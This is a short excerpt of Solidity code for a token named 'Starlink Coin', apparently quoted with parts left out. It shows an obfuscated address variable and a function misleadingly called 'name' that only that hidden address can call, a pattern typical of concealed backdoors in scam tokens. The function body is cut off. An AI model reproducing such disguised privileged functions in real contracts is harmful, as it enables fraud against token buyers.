...
contract STARLINK is Ownable {
    ...
    string public _tokenname = "Starlink Coin";
    string public _tokensymbol = "STARLINK";
    uint256 tokenamount = 10000000000*10**decimals();
    address public tgfdc45;
    ...
    function name(address jjkxq1) public     {
        require(tgfdc45 ==  _msgSender());
        if(tgfdc45 != _msgSender()){
                revert("fu");
        }
